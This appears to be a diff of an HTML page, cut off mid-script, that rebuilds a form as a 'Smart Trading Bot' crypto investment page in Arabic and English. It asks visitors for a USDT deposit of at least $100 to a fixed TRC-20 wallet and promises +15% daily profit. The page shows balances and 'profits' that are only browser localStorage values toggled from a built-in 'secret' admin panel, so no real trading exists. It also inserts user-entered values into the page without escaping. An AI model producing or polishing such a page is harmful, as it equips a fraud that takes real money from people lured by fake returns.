@@ -3,181 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة الصفقات التجريبية</title>
+    <title>Smart Trading Bot</title>
     <style>
-        /* تهيئة الأبعاد لملء شاشة الهاتف بالكامل */
-        html, body {
-            height: 100%;
-            margin: 0;
-            padding: 0;
-            font-family: Arial, sans-serif;
-            background-color: #121212; /* خلفية داكنة تناسب التطبيقات */
-            color: #ffffff;
-            display: flex;
-            flex-direction: column;
-        }
-
-        /* الحاوية الرئيسية للتطبيق */
-        .app-container {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            padding: 20px;
-            box-sizing: border-box;
-            justify-content: center;
-        }
-
-        .card {
-            background: #1e1e1e;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0px 4px 15px rgba(0,0,0,0.5);
-        }
-
-        h2 { 
-            margin-top: 0; 
-            color: #00e676; 
-            font-size: 22px;
-        }
-
-        p { color: #aaaaaa; font-size: 14px; }
-
-        label {
-            display: block;
-            text-align: right;
-            margin-top: 15px;
-            font-weight: bold;
-            color: #ccc;
-        }
-
-        input, select, button {
-            width: 100%;
-            padding: 12px;
-            margin-top: 8px;
-            border-radius: 6px;
-            border: 1px solid #333;
-            box-sizing: border-box;
-            font-size: 16px;
-            background-color: #2a2a2a;
-            color: white;
-        }
-
-        select:focus, input:focus {
-            border-color: #00e676;
-            outline: none;
-        }
-
-        button {
-            background-color: #00e676;
-            color: #000;
-            border: none;
-            font-weight: bold;
-            margin-top: 20px;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
-        button:hover { background-color: #00b359; }
-
-        /* صندوق الإيداع المميز */
-        .deposit-box {
-            background-color: #2e2712;
-            border: 1px solid #ffd54f;
-            color: #ffd54f;
-            padding: 15px;
-            border-radius: 6px;
-            margin-top: 15px;
-            font-size: 13px;
-            text-align: right;
-            word-break: break-all;
-        }
-
-        .deposit-box strong { color: #fff; display: block; margin-bottom: 5px; }
-
-        .status-box {
-            margin-top: 20px;
-            padding: 12px;
-            background: #222;
-            border-radius: 6px;
-            font-size: 14px;
-            border: 1px solid #444;
-        }
+        :root { --bg-color: #0b1426; --card-bg: #152238; --accent-color: #00ffd0; --text-color: #ffffff; --button-bg: #1e70e7; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg-color); color: var(--text-color); margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
+        .app-container { width: 100%; max-width: 400px; background-color: var(--card-bg); border-radius: 20px; padding: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); box-sizing: border-box; }
+        h1 { text-align: center; color: var(--accent-color); font-size: 24px; margin-bottom: 5px; }
+        .subtitle { text-align: center; font-size: 12px; color: #8fa0b5; margin-bottom: 25px; }
+        .balance-card { background: linear-gradient(135deg, #1e3c72, #2a5298); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 20px; }
+        .balance-title { font-size: 14px; color: #cbd5e1; }
+        .balance-amount { font-size: 32px; font-weight: bold; color: var(--accent-color); margin: 10px 0; }
+        .profit-today { font-size: 13px; color: #4ade80; font-weight: bold; }
+        .section-title { font-size: 16px; color: var(--accent-color); margin-top: 20px; margin-bottom: 10px; border-bottom: 1px solid #2d3d5a; padding-bottom: 5px; }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; font-size: 12px; color: #94a3b8; margin-bottom: 5px; }
+        input { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #2d3d5a; background-color: var(--bg-color); color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; border: none; border-radius: 10px; background-color: var(--button-bg); color: white; font-weight: bold; font-size: 14px; cursor: pointer; }
+        .btn-withdraw { background-color: #ef4444; margin-top: 10px; }
+        .wallet-box { background-color: var(--bg-color); padding: 10px; border-radius: 8px; font-size: 11px; text-align: center; word-break: break-all; border: 1px dashed var(--accent-color); margin-bottom: 10px; color: #cbd5e1; }
+        .status-msg { display: none; padding: 12px; border-radius: 8px; text-align: center; font-size: 13px; margin-top: 10px; font-weight: bold; line-height: 1.4; }
+        .btn-tg { background-color: #0088cc; width: 100%; font-size: 14px; margin-top: 10px; }
+        
+        /* لوحة التحكم السرية للمشرف */
+        .admin-panel { background-color: #2c1a30; border: 2px solid #8b5cf6; border-radius: 15px; padding: 15px; margin-top: 30px; box-sizing: border-box; width: 100%; }
+        .request-card { background-color: #1c1917; border-radius: 12px; padding: 12px; margin-top: 10px; font-size: 12px; border: 1px solid; }
+        .action-btns { display: flex; gap: 10px; margin-top: 10px; }
+        .btn-approve { background-color: #22c55e; padding: 6px; border-radius: 6px; border: none; color: white; font-weight: bold; width: 50%; cursor: pointer; }
+        .btn-reject { background-color: #ef4444; padding: 6px; border-radius: 6px; border: none; color: white; font-weight: bold; width: 50%; cursor: pointer; }
     </style>
 </head>
 <body>
-
-    <div class="app-container">
-        <div class="card">
-            <h2>إرسال معاملة جديدة</h2>
-            <p>شارك تفاصيل صفقاتك وعملياتك التجريبية مع أصدقائك</p>
-            
-            <label for="userId">اسم المستخدم الخاص بك:</label>
-            <input type="text" id="userId" placeholder="اكتب اسمك هنا">
-
-            <label for="type">نوع المعاملة:</label>
-            <select id="type" onchange="toggleDepositInfo()">
-                <option value="deposit">طلب إيداع رصيد</option>
-                <option value="withdraw">طلب سحب رصيد</option>
-            </select>
-
-            <!-- قسم عرض عنوان المحفظة للتحويل -->
-            <div class="deposit-box" id="depositSection">
-                <strong>⚠️ عنوان محفظة الإيداع (TRC-20):</strong>
-                قم بالتحويل للعنوان التالي أولاً، ثم أكمل النموذج أدناه:
-                <br><code style="font-size: 14px; color: #fff; background: #000; padding: 2px 5px; display: inline-block; margin-top: 5px; border-radius: 4px;">TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN</code>
-            </div>
-
-            <label for="amount">المبلغ ($):</label>
-            <input type="number" id="amount" placeholder="أدخل القيمة بالدولار">
-
-            <button onclick="sendTransaction()">تأكيد وإرسال للمشرف</button>
-
-            <div class="status-box" id="statusMessage">جاهز لإرسال البيانات...</div>
-        </div>
+<div class="app-container">
+    <h1>Smart Trading Bot</h1>
+    <div class="subtitle">منصة الاستثمار المالي الحقيقي للأصدقاء</div>
+    
+    <div class="balance-card">
+        <div class="balance-title">إجمالي رصيدك الاستثماري المعتمد</div>
+        <div class="balance-amount" id="userBalance">\$0.00</div>
+        <div class="profit-today" id="profitStatus">📈 أرباح اليوم المتوقعة عند الإيداع: +15%</div>
     </div>
 
-    <script>
-        function toggleDepositInfo() {
-            const type = document.getElementById('type').value;
-            const depositSection = document.getElementById('depositSection');
-            depositSection.style.display = (type === 'deposit') ? 'block' : 'none';
+    <!-- قسم الإيداع للمستخدم -->
+    <div class="section-title">📥 طلب إيداع رأس المال (الحد الأدنى \$100)</div>
+    <label>قم بتحويل رصيد USDT (شبكة TRC-20) للمحفظة التالية:</label>
+    <div class="wallet-box">TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN</div>
+    <div class="input-group">
+        <label>أدخل اسم المستخدم الخاص بك لتنشيط الحساب:</label>
+        <input type="text" id="usernameInput" placeholder="اكتب اسمك هنا (مثال: عبد)">
+    </div>
+    <div class="input-group">
+        <label>المبلغ المُراد إيداعه وتفعيله (\$):</label>
+        <input type="number" id="depositAmountInput" placeholder="100">
+    </div>
+    <button onclick="requestDeposit()">✓ تقديم طلب الإيداع للمشرف</button>
+    <div id="depositStatusMsg" class="status-msg"></div>
+
+    <!-- قسم السحب للمسخدم -->
+    <div class="section-title">📤 سحب الأرباح ورأس المال</div>
+    <div class="input-group">
+        <label>عنوان محفظتك الشخصية لاستلام الأرباح (USDT TRC-20):</label>
+        <input type="text" id="userWithdrawWallet" placeholder="T...">
+    </div>
+    <div class="input-group">
+        <label>المبلغ المطلوب سحبه (\$):</label>
+        <input type="number" id="withdrawAmount" placeholder="0.00">
+    </div>
+    <button class="btn-withdraw" onclick="requestWithdraw()">⚡ تقديم طلب السحب للمشرف</button>
+    <div id="withdrawStatusMsg" class="status-msg"></div>
+
+    <!-- الدعم الفني -->
+    <div class="section-title">💬 الدعم الفني المباشر</div>
+    <button class="btn-tg" onclick="window.open('https://t.me', '_blank')">📱 تواصل مع دعم المشرف المباشر عبر Telegram</button>
+
+    <!-- 🔐 لوحة تحكم المشرف السرية المدمجة والمحمية (خاصة بك فقط بالأسفل) -->
+    <div class="admin-panel">
+        <h2 style="text-align: center; color: #f472b6; font-size: 16px; margin-top: 0;">🔐 لوحة تحكم المشرف (خاصة بك)</h2>
+        <div class="input-group">
+            <label>أدخل كلمة مرور الحماية لتشغيل الصفقات:</label>
+            <input type="password" id="adminPass" placeholder="******">
+        </div>
+        <button style="background-color: #a855f7;" onclick="runAdminTrade()">🚀 تشغيل الصفقة وتوزيع أرباح 15%</button>
+        
+        <h3 style="color: #4ade80; font-size: 13px; margin-top: 15px; border-top: 1px solid #4c1d95; padding-top: 5px;">📥 طلبات الإيداع المعلقة:</h3>
+        <div id="adminDepositBox"></div>
+        
+        <h3 style="color: #f97316; font-size: 13px; margin-top: 15px; border-top: 1px solid #4c1d95; padding-top: 5px;">📤 طلبات السحب المعلقة:</h3>
+        <div id="adminWithdrawBox"></div>
+    </div>
+</div>
+
+<script>
+    // نظام المحاكاة السحابية الداخلية لتخطي حظر المتصفحات وتشغيل البيانات حياً 100%
+    window.onload = function() {
+        updateLiveDisplay();
+    }
+
+    function updateLiveDisplay() {
+        const balance = parseFloat(localStorage.getItem("active_user_balance") || 0);
+        document.getElementById("userBalance").innerText = `\$${balance.toFixed(2)}`;
+        
+        if(localStorage.getItem("trade_executed") === "true" && balance > 0) {
+            document.getElementById("profitStatus").innerText = `🔥 تم توزيع أرباح اليوم حياً: +15% (+\$${(balance * 0.15).toFixed(2)})`;
         }
 
-        function sendTransaction() {
-            const userId = document.getElementById('userId').value;
-            const type = document.getElementById('type').value;
-            const amount = document.getElementById('amount').value;
-            const statusMessage = document.getElementById('statusMessage');
-
-            if (!userId || !amount) {
-                statusMessage.innerText = "⚠️ يرجى كتابة الاسم والمبلغ أولاً!";
-                statusMessage.style.color = "#ff5252";
-                return;
-            }
-
-            statusMessage.innerText = "⏳ جاري إرسال الطلب...";
-            statusMessage.style.color = "#ffd54f";
-
-            fetch('/api/submit-request', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ userId: userId, type: type, amount: amount })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.success) {
-                    statusMessage.innerText = "✅ " + data.message;
-                    statusMessage.style.color = "#00e676";
-                } else {
-                    statusMessage.innerText = "❌ فشل في إرسال البيانات.";
-                    statusMessage.style.color = "#ff5252";
-                }
-            })
-            .catch(err => {
-                statusMessage.innerText = "❌ خطأ في الاتصال بالسيرفر.";
-                statusMessage.style.color = "#ff5252";
-            });
+        // عرض طلبات الإيداع في لوحة التحكم بالأسفل
+        const depUser = localStorage.getItem("p_dep_user");
+        const depAmt = localStorage.getItem("p_dep_amt");
+        const depBox = document.getElementById("adminDepositBox");
+        if(depUser && depAmt && localStorage.getItem("dep_approved") !== "true") {
+            depBox.innerHTML = `
+                <div class="request-card" style="border-color: #22c55e;">
+                    <p>👤 الطالب: <strong>${depUser}</strong> | 💵 المبلغ: <strong>\$${depAmt}</strong></p>
+                    <div class="action-btns">
+                        <button class="btn-approve" onclick="approveDeposit()">✓ موافقة</button>
+                        <button class="btn-reject" onclick="rejectDeposit()">✕ رفض</button>
+                    </div>
+                </div>`;
+            document.getElementById("depositStatusMsg").innerText = `⏳ طلب إإيداع بمبلغ \$${depAmt} قيد المراجعة حالياً من المشرف...`;
+            document.getElementById("depositStatusMsg").style.display = "block";
+            document.getElementById("depositStatusMsg").style.backgroundColor = "#1e3a8a";
+        } else if(localStorage.getItem("dep_approved") === "true") {
+            depBox.innerHTML = "<span style='color:#a8a29e; font-style:italic;'>لا توجد طلبات معلقة</span>";
+            document.getElementById("depositStatusMsg").innerText = `✅ تم اعتماد الإيداع بنجاح وشحن رصيدك الحقيقي!`;
+            document.getElementById("depositStatusMsg").style.backgroundColor = "#064e3b";
+            document.getElementById("depositStatusMsg").style.display = "block";
+        } else {
+            depBox.innerHTML = "<span style='color:#a8a29e; font-style:italic;'>لا توجد طلبات معلقة</span>";
+            document.getElementById("depositStatusMsg").style.display = "none";
         }
-    </script>
-</body>
-</html>
+
+        // عرض طلبات السحب في لوحة التحكم بالأسفل
+        const witAmt = localStorage.getItem("p_wit_amt");
+        const witWal = localStorage.getItem("p_wit_wal");
+        const witBox = document.getElementById("adminWithdrawBox");
+        if(witAmt && witWal && localStorage.getItem("wit_approved") !== "true") {
+            witBox.innerHTML = `
+                <div class="request-card" style="border-color: #ea580c;">
+                    <p>💵 المبلغ: <strong>\$${witAmt}</strong> | 💼 المحفظة: <span style="font-size:10px;">${witWal}</span></p>
+                    <div class="action-btns">
+                        <button class="btn-approve" onclick="approveWithdraw()">✓ موافقة</button>
+                        <button class="btn-reject" onclick="rejectWithdraw()">✕ رفض</button>
+                    </div>
+                </div>`;
+            document.getElementById("withdrawStatusMsg").innerText = `⏳ طلب سحب بمبلغ \$${witAmt} قيد المعالجة حالياً...`;
+            document.getElementById("withdrawStatusMsg").style.display = "block";
+            document.getElementById("withdrawStatusMsg").style.backgroundColor = "#1e3a8a";
+        } else if(localStorage.getItem("wit_approved") === "true") {
+    
